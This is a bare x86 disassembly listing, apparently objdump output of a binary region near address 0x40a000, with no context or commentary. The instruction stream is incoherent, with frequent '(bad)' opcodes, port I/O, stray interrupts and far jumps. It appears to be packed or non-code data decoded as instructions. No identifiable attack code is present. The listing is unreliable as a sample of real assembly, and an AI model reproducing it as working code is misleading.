  40a071:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a073:	shl    BYTE PTR [eax-0x1d],0x47
  40a077:	xlat   BYTE PTR ds:[ebx]
  40a078:	xchg   ebp,eax
  40a079:	rol    bl,1
  40a07b:	call   0x3baa:0x6831f35
  40a082:	div    BYTE PTR [edx]
  40a084:	ins    BYTE PTR es:[edi],dx
  40a085:	in     eax,0xa4
  40a087:	lods   al,BYTE PTR ds:[esi]
  40a088:	in     eax,0x78
  40a08a:	mov    dh,0x32
  40a08c:	in     al,dx
  40a08d:	aam    0x82
  40a08f:	int    0xbf
  40a091:	mov    ah,0x60
  40a093:	cmp    DWORD PTR [ebx+0x5a],esi
  40a096:	or     BYTE PTR [ebx+0xf612c67],al
  40a09c:	(bad)
  40a09f:	stos   DWORD PTR es:[edi],eax
  40a0a0:	inc    ebp
  40a0a1:	xchg   ebp,eax
  40a0a2:	(bad)  [edi-0x17]
  40a0a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a0a6:	fcmovnu st,st(1)
  40a0a8:	es (bad) 
  40a0aa:	in     eax,dx
  40a0ab:	push   ss
  40a0ac:	sbb    BYTE PTR ds:0x7a4d9b,ch
  40a0b2:	imul   edx,DWORD PTR cs:[edi+0x4],0x337dd9f1
  40a0ba:	push   edx
  40a0bb:	pop    ecx
  40a0bc:	lea    ebx,[ebx+esi*2-0x76]
  40a0c0:	rcr    DWORD PTR [eax],cl
  40a0c2:	push   0x6
  40a0c4:	in     eax,0xe1
  40a0c6:	gs pop ebx
  40a0c8:	jmp    0x40a12f
  40a0ca:	adc    DWORD PTR [ecx-0xf],edx
  40a0cd:	call   0x4d6d334b
  40a0d2:	pusha  
  40a0d3:	pop    esi
  40a0d4:	ins    BYTE PTR es:[edi],dx
  40a0d5:	popa   
  40a0d6:	fnstcw WORD PTR [esp+eiz*4+0x23]
  40a0da:	xor    DWORD PTR [esi-0x34],ebp
  40a0dd:	sbb    dh,bh
  40a0df:	mov    cl,0x0
  40a0e1:	addr16 mov eax,ds:0xaf78
  40a0e5:	and    eax,0x2e6a90be
  40a0ea:	call   0x5011:0xc08ccecb
  40a0f1:	out    0x0,al
  40a0f3:	repz inc esp
  40a0f5:	cli    
  40a0f6:	(bad)  
  40a0f8:	push   ecx
  40a0f9:	xor    al,0x11
  40a0fb:	xchg   edi,eax
  40a0fc:	loope  0x40a08a
  40a0fe:	ret    0x8071
  40a101:	ja     0x40a08b
  40a103:	xchg   ecx,ebx
  40a105:	dec    ecx
  40a106:	retf   
  40a107:	into   
  40a108:	sahf   
  40a109:	out    0x2b,al
  40a10b:	add    edi,edi
  40a10d:	sbb    cl,BYTE PTR [esi-0x23]
  40a110:	mov    al,ds:0xb1472295
  40a115:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a116:	xchg   edx,eax
  40a117:	dec    ecx
  40a118:	sub    BYTE PTR [ecx],al
  40a11a:	dec    eax
  40a11b:	outs   dx,DWORD PTR ds:[esi]
  40a11c:	test   BYTE PTR [edx],al
  40a11e:	sbb    ch,BYTE PTR [edx]
  40a120:	jecxz  0x40a14c
  40a122:	jmp    0x40a0b3
  40a124:	xchg   ebp,eax
  40a125:	int    0xe8
  40a127:	sti    
  40a128:	jae    0x40a1a5
  40a12a:	(bad)  
  40a12b:	call   0xa0c7185c
  40a130:	outs   dx,DWORD PTR ds:[esi]
  40a131:	int    0x62
  40a133:	and    cl,ah
  40a135:	ret    0x689a
  40a138:	push   ebx
  40a139:	jbe    0x40a129
  40a13b:	fld    QWORD PTR [esi-0x33]
  40a13e:	push   cs
  40a13f:	xor    DWORD PTR [ebp-0x7a6816f1],eax
  40a145:	stos   DWORD PTR es:[edi],eax
  40a146:	cdq    
  40a147:	jo     0x40a183
  40a149:	sub    BYTE PTR [eax-0x44],0xc9
  40a14d:	fs inc ebx
  40a14f:	ds out 0xa3,eax
  40a152:	xor    DWORD PTR [ecx],ebp
  40a154:	jne    0x40a154
  40a156:	iret   
  40a157:	push   ds
  40a158:	aas    
  40a159:	out    0x8a,al
  40a15b:	jg     0x40a1a9
  40a15d:	jmp    0x15d5:0x9b8477f5
  40a164:	pop    es
  40a165:	cwde   
  40a166:	push   esi
  40a167:	xchg   BYTE PTR [esi+0x8],al
  40a16a:	pop    eax
  40a16b:	sub    al,0xad
  40a16d:	sbb    BYTE PTR [eax+0x1f],dl
  40a170:	push   cs
  40a171:	push   edx
  40a172:	inc    ebp
  40a173:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a174:	out    0xe6,eax
  40a176:	je     0x40a10b
  40a178:	call   FWORD PTR [ebp-0x69]
  40a17b:	xor    BYTE PTR [edi*1+0xc32ab33],0x1c
  40a183:	pop    ds
  40a184:	adc    al,0xbf
  40a186:	mov    dl,0x8f
  40a188:	add    ecx,DWORD PTR [ecx]
  40a18a:	or     DWORD PTR [eax],edx
  40a18c:	bnd jne 0x40a201
  40a18f:	lds    ecx,FWORD PTR [ecx+0x21]
  40a192:	mov    edx,0x9de55477
  40a197:	and    ebp,DWORD PTR [esp+ebx*4+0x71]
  40a19b:	jb     0x40a1e2
  40a19d:	lock loopne 0x40a1b5
  40a1a0:	rol    ah,cl
  40a1a2:	cmc    
  40a1a3:	imul   edi,DWORD PTR [eax-0x1a222f0b],0xd
  40a1aa:	fmul   QWORD PTR [edx+0x54]
  40a1ad:	mov    edi,0x88e933db
  40a1b2:	enter  0xca29,0xe1
  40a1b6:	mov    ah,0xf1
  40a1b8:	jno    0x40a1cb
  40a1ba:	in     al,0xa2
  40a1bc:	jb     0x40a210
  40a1be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a1bf:	sti    
  40a1c0:	add    esp,DWORD PTR [ebx+0x6]
  40a1c3:	loopne 0x40a167
  40a1c5:	mov    ch,0x6b
  40a1c7:	push   ecx
  40a1c8:	sti    
  40a1c9:	mov    ebx,0x9990f566
  40a1ce:	jmp    0x5a27:0x726a7110
  40a1d5:	or     bh,BYTE PTR [edi+0x34]
  40a1d8:	and    eax,0x36d00d16
  40a1dd:	lds    esi,FWORD PTR [esi+0x35]
  40a1e0:	test   DWORD PTR [ebx],esi
  40a1e2:	pop    ecx
  40a1e3:	(bad)  
  40a1e4:	push   ds
  40a1e5:	stos   DWORD PTR es:[edi],eax
  40a1e6:	shl    ecx,cl
  40a1e8:	pop    ebx
  40a1e9:	std    
  40a1ea:	fnstcw WORD PTR [ebp+ecx*8+0x78]
  40a1ee:	dec    esi
  40a1ef:	push   esp
  40a1f0:	stos   DWORD PTR es:[edi],eax
  40a1f1:	adc    esp,DWORD PTR [ebx]
  40a1f3:	scas   al,BYTE PTR es:[edi]
  40a1f4:	call   FWORD PTR [edi]
  40a1f6:	add    al,BYTE PTR [esi]
  40a1f8:	popa   
  40a1f9:	pusha  
  40a1fa:	rcl    BYTE PTR [eax-0x366286f5],0x40
  40a201:	jnp    0x40a1b7
  40a203:	mov    esi,0xcf50989c
  40a208:	shr    BYTE PTR [eax],cl
  40a20a:	aad    0xdb
  40a20c:	cli    
  40a20d:	push   ebx
  40a20e:	cmp    DWORD PTR [ebp-0x47],ebp
  40a211:	adc    al,0x41
  40a213:	ss cmc 
  40a215:	adc    ah,BYTE PTR [ecx+0x2851c2c0]
  40a21b:	out    dx,eax
  40a21c:	xchg   esp,eax
  40a21d:	sbb    bh,BYTE PTR [edi]
  40a21f:	or     cl,dh
  40a221:	and    DWORD PTR [ecx+0x66],ebp
  40a224:	repz mov dh,0xcf
  40a227:	pop    edx
  40a228:	jmp    0x40a267
  40a22a:	test   eax,0x62596824
  40a22f:	jmp    0x40a28a
  40a231:	sahf   
  40a232:	dec    edx
  40a233:	ins    DWORD PTR es:[edi],dx
  40a234:	sub    eax,0x38b749bb
  40a239:	fmul   QWORD PTR ds:0xa1513ff3
  40a23f:	mov    gs,WORD PTR [esi]
  40a241:	xor    eax,0x46d499ec
  40a246:	mov    eax,ds:0x2b15a754
  40a24b:	scas   al,BYTE PTR es:[edi]
  40a24c:	mov    bh,0x1
  40a24e:	pop    edi
  40a24f:	pop    esp
  40a250:	shl    BYTE PTR [ebp+eiz*2-0x29],1
  40a254:	mov    DWORD PTR [ebp+ebx*1+0x69],esp
  40a258:	inc    esp
  40a259:	mov    eax,ds:0x8b9844f3
  40a25e:	and    DWORD PTR ds:0xeba3a196,esp
  40a264:	mov    ebx,0x32c518a9
  40a269:	aad    0xdc
  40a26b:	addr16 push ss
  40a26d:	icebp  
  40a26e:	in     eax,0x7f
  40a270:	in     eax,dx
  40a271:	jo     0x40a225
  40a273:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a274:	sti    
  40a275:	push   edi
  40a276:	mov    ecx,DWORD PTR [esi-0x5d]
  40a279:	enter  0x95fe,0xb
  40a27d:	mov    bl,0xed
  40a27f:	sbb    DWORD PTR [esi-0x12ecb0e],0x768e9afa
  40a289:	loop   0x40a286
  40a28b:	jno    0x40a2ce
  40a28d:	jb     0x40a229
  40a28f:	ret    
  40a290:	int3   
  40a291:	stc    
  40a292:	je     0x40a2f7
  40a294:	ret    
  40a295:	call   0x347f67a8
  40a29a:	and    edi,DWORD PTR [edi+0x6d]
  40a29d:	(bad)  
  40a29e:	adc    al,0x20
  40a2a0:	mov    ch,0x3a
  40a2a2:	cmp    DWORD PTR [ebx],0xdbd9d3db
  40a2a8:	pop    esi
  40a2a9:	shl    bh,cl
  40a2ab:	ja     0x40a237
  40a2ad:	ins    DWORD PTR es:[edi],dx
  40a2ae:	mov    esp,0xb2948430
  40a2b3:	and    ah,BYTE PTR [ebx-0x3b]
  40a2b6:	inc    eax
  40a2b7:	dec    esi
  40a2b8:	xchg   edx,eax
  40a2b9:	ins    DWORD PTR es:[edi],dx
  40a2ba:	dec    esi
  40a2bb:	in     eax,dx
  40a2bc:	adc    cl,BYTE PTR [esi+0x5e]
  40a2bf:	cmp    bh,al
  40a2c1:	xchg   esi,eax
  40a2c2:	jae    0x40a2cc
  40a2c4:	jo     0x40a279
  40a2c6:	pop    ds
  40a2c7:	sbb    BYTE PTR [ecx+0x26],bh
  40a2ca:	pop    esp
  40a2cb:	not    BYTE PTR [ebp+0x54]
  40a2ce:	enter  0x559e,0xdf
  40a2d2:	pop    ds
  40a2d3:	mov    bh,0x4d
  40a2d5:	stc    
  40a2d6:	not    DWORD PTR [edx+ebp*1-0x12eb3a46]
  40a2dd:	mov    ebx,0x64cf08e4
  40a2e2:	ret    
  40a2e3:	adc    WORD PTR [edi-0x10],ax
  40a2e7:	ret    
  40a2e8:	mov    dh,BYTE PTR [ebx]
  40a2ea:	cdq    
  40a2eb:	mov    BYTE PTR [esi-0x4b],ah
  40a2ee:	xor    bl,0x5d
  40a2f1:	sar    BYTE PTR [ebp-0x782d67dd],0x70
  40a2f8:	mov    ah,0x84
  40a2fa:	fidivr DWORD PTR [ecx-0x109e0315]
  40a300:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a301:	int3   
  40a302:	mov    ?,WORD PTR ds:0xc67056bf
  40a308:	cli    
  40a309:	xchg   ebx,eax
  40a30a:	sub    ebp,DWORD PTR [edi-0x7f354d5e]
  40a310:	aam    0x11
  40a312:	gs stos DWORD PTR es:[edi],eax
  40a314:	adc    esp,DWORD PTR [edx]
  40a316:	fsin   
  40a318:	pushf  
  40a319:	in     eax,dx
  40a31a:	outs   dx,DWORD PTR ds:[esi]
  40a31b:	adc    eax,0x5728d235
  40a320:	mov    ds:0x90be0dc1,eax
  40a325:	bound  si,DWORD PTR [edi-0x64e3b231]
  40a32c:	pop    eax
  40a32d:	call   0x53eeeea2
  40a332:	gs mov dh,0x3c
  40a335:	push   edi
  40a336:	in     eax,0xa7
  40a338:	into   
  40a339:	out    0xd3,al
  40a33b:	adc    BYTE PTR [ebp+esi*8+0x7ab30d0a],dl
  40a342:	jg     0x40a3a2
  40a344:	js     0x40a38f
  40a346:	xlat   BYTE PTR ds:[ebx]
  40a347:	jbe    0x40a3c3
  40a349:	(bad)  
  40a34a:	out    dx,eax
  40a34b:	and    ebx,DWORD PTR [edx-0x64]
  40a34e:	and    cl,BYTE PTR [edi+0x3e57087b]
  40a354:	mov    ?,WORD PTR [edi+0x2dca18ee]
  40a35a:	mov    esi,0xa553ce16
  40a35f:	push   0xffffff88
  40a361:	imul   esi,ecx,0x845fd67c
  40a367:	hlt    
  40a368:	jp     0x40a2ff
  40a36a:	cmp    al,0x22
  40a36c:	mov    ebx,0x2551e6f4
  40a371:	rol    bl,cl
  40a373:	pop    ebp
  40a374:	pop    ecx
  40a375:	cmp    ch,BYTE PTR [eax-0x1d]
  40a378:	adc    ah,BYTE PTR [esp+edx*8+0x471ca721]
  40a37f:	fcmovnbe st,st(7)
  40a381:	sbb    al,0xe4
  40a383:	and    eax,0xe7f61e78
  40a388:	jne    0x40a344
  40a38a:	addr16 jg 0x40a343
  40a38d:	adc    eax,0xdcff3bad
  40a392:	jns    0x40a369
  40a394:	es xchg edx,eax
  40a396:	dec    esp
  40a397:	xchg   edi,eax
  40a398:	mov    dl,0xd4
  40a39a:	xchg   DWORD PTR [ebx],edx
  40a39c:	loopne 0x40a3a2
  40a39e:	sub    DWORD PTR [edx-0x397db075],edi
  40a3a4:	out    0x5c,al
  40a3a6:	loope  0x40a39f
  40a3a8:	and    ebp,DWORD PTR [eax+esi*8+0x79cb8261]
  40a3af:	test   DWORD PTR [ecx+0xa3ae32],edi
  40a3b5:	mov    bl,0x40
  40a3b7:	or     al,0x10
  40a3b9:	repz cld 
  40a3bb:	(bad)  
  40a3bc:	ja     0x40a37b
  40a3be:	mov    al,ds:0x156024a5
  40a3c3:	hlt    
  40a3c4:	sbb    al,0x61
  40a3c6:	xchg   edx,eax
  40a3c7:	cmp    eax,0x2fd72849
  40a3cc:	in     al,0x23
  40a3ce:	dec    esi
  40a3cf:	add    ah,BYTE PTR [edi+0x78]
  40a3d2:	cli    
  40a3d3:	mov    ch,BYTE PTR [ebx-0x536fae98]
  40a3d9:	add    esp,DWORD PTR [ebp-0x34c8565a]
  40a3df:	jmp    0xecfbbcb5
  40a3e4:	or     BYTE PTR [ebx-0x19],ah
  40a3e7:	das    
  40a3e8:	loopne 0x40a3b1
  40a3ea:	aam    0x11
  40a3ec:	inc    edx
  40a3ed:	cmp    DWORD PTR [edi-0x4c83d936],0xff8f0270
  40a3f7:	std    
  40a3f8:	rcl    DWORD PTR [esi+ecx*1+0x6961522f],cl
  40a3ff:	push   0xffffff95
  40a401:	iret   
  40a402:	mov    eax,0xb1aae3aa
  40a407:	dec    ecx
  40a408:	je     0x40a3d1
  40a40a:	cmovle ecx,esp
  40a40d:	cmp    BYTE PTR [ecx-0xd7286c6],cl
  40a413:	ret    0xb5e1
  40a416:	cwde   
  40a417:	or     dl,cl
  40a419:	bound  eax,QWORD PTR [ebx]
  40a41b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a41c:	enter  0xd3b6,0xa
  40a420:	adc    BYTE PTR [ebx],ah
  40a422:	adc    esp,eax
  40a424:	add    al,0x49
  40a426:	pop    ebx
  40a427:	lea    esp,[esi+eiz*1]
  40a42a:	and    ebp,DWORD PTR [edx+0x36]
  40a42d:	add    DWORD PTR [eax+0x71a47ff5],edi
  40a433:	int    0x9a
  40a435:	and    ecx,DWORD PTR [eax]
  40a437:	pand   mm6,QWORD PTR [ebx+ecx*8-0x2b]
  40a43c:	add    dl,BYTE PTR [edi-0x6fa68b23]
  40a442:	pop    ss
  40a443:	dec    ecx
  40a444:	ror    DWORD PTR [ebx+0x1347bc3c],0x3a
  40a44b:	mov    gs,eax
  40a44d:	cdq    
  40a44e:	mov    eax,0x135a0330
  40a453:	ret    0xf717
  40a456:	jle    0x40a3f7
  40a458:	in     eax,dx
  40a459:	arpl   WORD PTR [ebp+0x1cdc78bc],si
  40a45f:	jp     0x40a4a1
  40a461:	push   0x61
  40a463:	add    DWORD PTR ds:0xe34073b9,ebp
  40a469:	cdq    
  40a46a:	addr16 add bl,dh
  40a46d:	lods   al,BYTE PTR ds:[esi]
  40a46e:	(bad)  
  40a470:	xor    eax,0xdfe3f7b7
  40a475:	adc    BYTE PTR [esi+0xd],ah
  40a478:	sub    al,0x15
  40a47a:	stos   BYTE PTR es:[edi],al
  40a47b:	mov    ah,0xb1
  40a47d:	popa   
  40a47e:	mov    al,ds:0xc5eea066
  40a483:	sub    eax,0x74d65f17
  40a488:	imul   edx,DWORD PTR [ebp-0x12],0x7d
  40a48c:	pop    ecx
  40a48d:	std    
  40a48e:	test   BYTE PTR [eax],dh
  40a490:	pop    edi
  40a491:	xchg   esi,eax
  40a492:	mov    al,al
  40a494:	loope  0x40a4ec
  40a496:	add    al,0x0
  40a498:	pop    esp
  40a499:	into   
  40a49a:	mov    edx,0x650f24a1
  40a49f:	out    0x47,al
  40a4a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a4a2:	push   ebp
  40a4a3:	mov    DWORD PTR [esi],esi
  40a4a5:	sbb    eax,0x401934ee
  40a4aa:	lock retf 
  40a4ac:	push   ebp
  40a4ad:	into   
  40a4ae:	and    al,0x6f
  40a4b0:	pop    ebx
  40a4b1:	jge    0x40a4fd
  40a4b3:	pop    ebp
  40a4b4:	mov    edi,0x4e148f3a
  40a4b9:	push   0xc0c535d1
  40a4be:	xor    eax,0xac889c7a
  40a4c3:	dec    ebx
  40a4c4:	fs push ebx
  40a4c6:	dec    eax
  40a4c7:	cmp    eax,0xa9c6897e
  40a4cc:	fisub  DWORD PTR [esi-0x20c92df9]
  40a4d2:	out    dx,eax
  40a4d3:	dec    esp
  40a4d4:	das    
  40a4d5:	in     al,dx
  40a4d6:	jmp    0xc22f:0x210b5b45
  40a4dd:	and    BYTE PTR [edi+0x7cee25b8],0xe9
  40a4e4:	or     al,0x2c
  40a4e6:	nop
  40a4e7:	pop    edi
  40a4e8:	frstor [ebp-0x15c4467d]
  40a4ee:	cmp    al,0xc4
  40a4f0:	push   edx
  40a4f1:	mov    esp,0xf5a3efcb
  40a4f6:	inc    ebx
  40a4f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a4f8:	mov    bl,0xd7
  40a4fa:	xor    edi,DWORD PTR [esi]
  40a4fc:	xchg   edx,eax
  40a4fd:	into   
  40a4fe:	pop    esp
  40a4ff:	js     0x40a4ad
  40a501:	les    ecx,FWORD PTR [ecx]
  40a503:	sub    al,0xbe
  40a505:	add    bl,BYTE PTR [eax]
  40a507:	xchg   esp,eax
  40a508:	hlt    
  40a509:	das    
  40a50a:	lods   al,BYTE PTR ds:[esi]
  40a50b:	(bad)  
  40a50c:	call   FWORD PTR [eax]
  40a50e:	add    BYTE PTR [ebx-0x55],ch
  40a511:	pop    ecx
  40a512:	jns    0x40a58f
  40a514:	jmp    0xbaff2d9b
  40a519:	and    DWORD PTR [edx],ebp
  40a51b:	xlat   BYTE PTR ds:[ebx]
  40a51c:	jne    0x40a571
  40a51e:	sbb    esp,DWORD PTR [eax+0xe]
  40a521:	lods   eax,DWORD PTR ss:[esi]
  40a523:	xor    bh,0x81
  40a526:	sahf   
  40a527:	mov    eax,DWORD PTR [ecx+0x2a2729ff]
  40a52d:	push   edi
  40a52e:	in     eax,dx
  40a52f:	(bad)  
  40a530:	sub    BYTE PTR gs:[edi-0x33b02fc4],al
  40a537:	sub    bl,dh
  40a539:	push   ebx
  40a53a:	cmovp  eax,esp
  40a53d:	push   es
  40a53e:	outs   dx,DWORD PTR ds:[esi]
  40a53f:	js     0x40a58e
  40a541:	ss xchg ebx,eax
  40a543:	loopne 0x40a5c0
  40a545:	add    DWORD PTR [edi+0x70],0xffffffb6
  40a549:	stos   DWORD PTR es:[edi],eax
  40a54a:	xor    eax,0x958b8147
  40a54f:	push   edx
  40a550:	fisub  WORD PTR [ebp+eax*8-0x11]
  40a554:	(bad)  
  40a555:	push   edx
  40a556:	outs   dx,BYTE PTR ds:[esi]
  40a557:	adc    eax,0x6c7cad87
  40a55c:	push   ss
  40a55d:	shr    BYTE PTR [eax+0xf6cc058],cl
  40a563:	inc    esi
  40a564:	lods   al,BYTE PTR ds:[esi]
  40a565:	fisttp QWORD PTR [ecx]
  40a567:	push   0x730f218b
  40a56c:	sub    dl,dl
  40a56e:	(bad)  
  40a570:	dec    bh
  40a572:	lods   al,BYTE PTR ds:[esi]
  40a573:	cld    
  40a574:	sahf   
  40a575:	xchg   BYTE PTR [edx],ah
  40a577:	inc    eax
  40a578:	and    edi,ebp
  40a57a:	out    dx,eax
  40a57b:	mov    edx,0x7d9777bc
  40a580:	outs   dx,DWORD PTR ds:[esi]
  40a581:	mov    ebx,0xc0f2fc41
  40a586:	div    DWORD PTR [esi-0x15]
  40a589:	jne    0x40a523
  40a58b:	jecxz  0x40a5e0
  40a58d:	cmp    BYTE PTR [edx],bh
  40a58f:	jno    0x40a59d
  40a591:	cmp    ah,BYTE PTR [eax+0x23]
  40a594:	or     DWORD PTR [edi-0x4b],edi
  40a597:	sahf   
  40a598:	daa    
  40a599:	jnp    0x40a531
  40a59b:	in     al,0xfb
  40a59d:	shr    DWORD PTR [edi-0x62532d93],cl
  40a5a3:	dec    esp
  40a5a4:	xchg   esp,eax
  40a5a5:	in     eax,dx
  40a5a6:	mov    esp,0xd3598b4e
  40a5ab:	jae    0x40a61e
  40a5ad:	sbb    ebx,DWORD PTR [ebx+0x71]
  40a5b0:	loop   0x40a56b
  40a5b2:	std    
  40a5b3:	adc    eax,DWORD PTR [ebx-0x5bae35b5]
  40a5b9:	jle    0x40a5a9
  40a5bb:	test   al,0xab
  40a5bd:	jg     0x40a61f
  40a5bf:	jmp    0x8761:0xee35bec8
  40a5c6:	mov    al,0xdb
  40a5c8:	and    ecx,ebx
  40a5ca:	(bad)  
  40a5cb:	sbb    DWORD PTR [ecx-0x3d9ac4ea],0x23
  40a5d2:	push   ecx
  40a5d3:	jb     0x40a628
  40a5d5:	int    0x98
  40a5d7:	mov    eax,ds:0xc3c13cbf
  40a5dc:	sub    eax,0xa8b01cf1
  40a5e1:	das    
  40a5e2:	push   ds
  40a5e3:	jnp    0x40a5f4
  40a5e5:	ja     0x40a65e
  40a5e7:	jbe    0x40a642
  40a5e9:	(bad)  [ebp-0x1d6ccfa0]
  40a5ef:	cwde   
  40a5f0:	(bad)  
  40a5f1:	retf   
  40a5f2:	sub    eax,0xb6d2ee
  40a5f7:	dec    ebp
  40a5f8:	pop    es
  40a5f9:	adc    al,0xc1
  40a5fb:	icebp  
  40a5fc:	or     BYTE PTR [ebp-0x75],ah
  40a5ff:	mov    ah,0x23
  40a601:	sbb    eax,DWORD PTR [ebp+0x22]
  40a604:	mov    dl,0x69
  40a606:	lahf   
  40a607:	mov    dh,0x28
  40a609:	imul   esi,DWORD PTR [eax+0x35],0xffffffd9
  40a60d:	call   0xf156:0x97008e36
  40a614:	sub    DWORD PTR [ebx+0x408c56ff],0xffffff88
  40a61b:	hlt    
  40a61c:	lods   al,BYTE PTR ds:[esi]
  40a61d:	xlat   BYTE PTR ds:[ebx]
  40a61e:	and    ebp,edi
  40a620:	fstp   DWORD PTR [esi+0xa]
  40a623:	outs   dx,BYTE PTR ds:[esi]
  40a624:	imul   DWORD PTR [ebx-0x3f]
  40a627:	lahf   
  40a628:	mov    esi,0x50076b00
  40a62d:	inc    ebx
  40a62e:	add    BYTE PTR [edi],al
  40a630:	push   ecx
  40a631:	adc    BYTE PTR [edi-0x12],bl
  40a634:	adc    BYTE PTR [edx],cl
  40a636:	lea    ebp,[eax+0x2e]
  40a639:	fild   DWORD PTR es:[ebp+0x35728e76]
  40a640:	jo     0x40a5e8
  40a642:	call   0xdcdf:0xa0d001fe
  40a649:	jmp    0x40b05188
  40a64e:	imul   esi,DWORD PTR [ecx+0x79],0xffffff9b
  40a652:	cld    
  40a653:	imul   ebx,edi,0xffffffd3
  40a656:	sbb    ebp,ecx
  40a658:	xor    DWORD PTR [edi+0x1c],esp
  40a65b:	stos   DWORD PTR es:[edi],eax
  40a65c:	jge    0x40a5ff
  40a65e:	mov    dl,0x2b
  40a660:	fs aad 0x8c
  40a663:	xchg   BYTE PTR [edi],al
  40a665:	or     ebp,esi
  40a667:	enter  0xf47d,0x37
  40a66b:	fs pop ebx
  40a66d:	pop    eax
  40a66e:	dec    eax
  40a66f:	push   esp
  40a670:	pop    eax
  40a671:	push   ss
  40a672:	sbb    ebp,DWORD PTR [edx-0x24]
  40a675:	push   ss
  40a676:	adc    DWORD PTR [edx+0x50d9b4d8],0x48b3bace
  40a680:	xchg   BYTE PTR [esi],al
  40a682:	fiadd  WORD PTR [ebx+0x37cc3292]
  40a688:	(bad)  
  40a68a:	and    BYTE PTR [edx+0x56],0x83
  40a68e:	or     DWORD PTR [esi*1+0x77f098b9],0x8bd6c4a8
  40a699:	mov    ah,0x31
  40a69b:	lahf   
  40a69c:	outs   dx,DWORD PTR ds:[esi]
  40a69d:	cli    
  40a69e:	pop    ecx
  40a69f:	jae    0x40a6f4
  40a6a1:	sbb    DWORD PTR [edx+0x4d],ecx
  40a6a4:	dec    esp
  40a6a5:	int    0x89
  40a6a7:	xchg   esp,eax
  40a6a8:	sub    DWORD PTR [ebx],ecx
  40a6aa:	ret    
  40a6ab:	mov    eax,0x9505b360
  40a6b0:	mov    cl,0xd1
  40a6b2:	inc    eax
  40a6b3:	mov    eax,0x37d8c505
  40a6b8:	fwait
  40a6b9:	inc    ecx
  40a6ba:	adc    BYTE PTR [edi-0x54849ea2],0x74
  40a6c1:	push   esi
  40a6c2:	or     ah,BYTE PTR [edi-0x7a]
  40a6c5:	push   edi
  40a6c6:	les    ebp,FWORD PTR [edi]
  40a6c8:	or     dh,BYTE PTR [esi]
  40a6ca:	inc    esi
  40a6cb:	jae    0x40a6d3
  40a6cd:	or     eax,0xd3cbabb
  40a6d2:	add    al,0xbc
  40a6d4:	cmp    al,0x8e
  40a6d6:	cwde   
  40a6d7:	(bad)  
  40a6d8:	pop    esi
  40a6d9:	gs or  al,0xd1
  40a6dc:	adc    ch,BYTE PTR [edx-0x4c]
  40a6df:	cmp    al,0x62
  40a6e1:	icebp  
  40a6e2:	leave  
  40a6e3:	shl    BYTE PTR [edi+0x25ac0ffc],0xb7
  40a6ea:	data16 mov bh,0xaa
  40a6ed:	dec    esp
  40a6ee:	inc    esp
  40a6ef:	sahf   
  40a6f0:	mov    cl,0xa8
  40a6f2:	out    0x2a,al
  40a6f4:	mov    dh,0x91
  40a6f6:	sub    al,0x2d
  40a6f8:	iret   
  40a6f9:	xchg   edi,eax
  40a6fa:	fisub  WORD PTR [ecx+esi*1-0x44]
  40a6fe:	push   cs
  40a6ff:	pop    ss
  40a700:	sub    ah,BYTE PTR [ecx-0x1ecb7c70]
  40a706:	sti    
  40a707:	mov    DWORD PTR [ecx-0x73647889],eax
  40a70d:	sub    al,0x44
  40a70f:	test   esi,0xbf32d1ef
  40a715:	fdiv   QWORD PTR [esi+ebx*1]
  40a718:	sahf   
  40a719:	mov    eax,ds:0x45683c43
  40a71e:	fwait
  40a71f:	stc    
  40a720:	dec    eax
  40a721:	pop    esi
  40a722:	push   ebx
  40a723:	xlat   BYTE PTR ds:[ebx]
  40a724:	bound  ebp,QWORD PTR [eax]
  40a726:	sbb    esp,DWORD PTR [edx]
  40a728:	popf   
  40a729:	ja     0x40a6ae
  40a72b:	push   ebp
  40a72c:	dec    edi
  40a72d:	mov    esp,0x3922d9ba
  40a732:	fisttp WORD PTR [edi-0x7d1e06e7]
  40a738:	and    cl,BYTE PTR [edx-0x29]
  40a73b:	pop    ds
  40a73c:	sti    
  40a73d:	xlat   BYTE PTR ds:[ebx]
  40a73e:	mov    al,ds:0x96209315
  40a743:	push   edx
  40a744:	sbb    BYTE PTR [esi+0x57285cf5],0xf7
  40a74b:	pop    esp
  40a74c:	pop    esi
  40a74d:	fist   WORD PTR [eax-0xc]
  40a750:	ins    BYTE PTR es:[edi],dx
  40a751:	dec    esi
  40a752:	add    DWORD PTR [esi+0x15edba35],esp
  40a758:	les    ebx,FWORD PTR [ebx+0x47]
  40a75b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a75c:	add    edx,eax
  40a75e:	cmc    
  40a75f:	stos   DWORD PTR es:[edi],eax
  40a760:	mov    bh,0x1b
  40a762:	mov    ecx,0x5ac1baf8
  40a767:	rcl    BYTE PTR es:[eax-0x5b1c1571],cl
  40a76e:	mov    ebp,0xb7bcfdc1
  40a773:	js     0x40a792
  40a775:	test   al,0xd1
  40a777:	scas   eax,DWORD PTR es:[edi]
  40a778:	jb     0x40a7ca
  40a77a:	pushw  0x6a
  40a77d:	in     eax,dx
  40a77e:	cmp    al,BYTE PTR [edx+0x72c0ee84]
  40a784:	out    dx,al
  40a785:	or     ebx,DWORD PTR [edx+0x64]
  40a788:	retf   0x956f
  40a78b:	ror    BYTE PTR ds:0xe134a702,cl
  40a791:	mov    gs,WORD PTR [ebp-0x3ceaf27]
  40a797:	sbb    ah,BYTE PTR [esi+ebx*8]
  40a79a:	jecxz  0x40a774
  40a79c:	cmp    al,BYTE PTR [esi+0x22]
  40a79f:	js     0x40a77d
  40a7a1:	sti    
  40a7a2:	in     eax,0xb0
  40a7a4:	aaa    
  40a7a5:	fidivr WORD PTR [edx]
  40a7a7:	daa    
  40a7a8:	push   DWORD PTR [edi+0x64f0a0b3]
  40a7ae:	fcmove st,st(2)
  40a7b0:	and    DWORD PTR [edx],eax
  40a7b2:	jge    0x40a7a8
  40a7b4:	fsubp  st(3),st
  40a7b6:	hlt    
  40a7b7:	pusha  
  40a7b8:	add    bh,BYTE PTR [eax+0x3158310c]
  40a7be:	in     eax,dx
  40a7bf:	push   esi
  40a7c0:	dec    eax
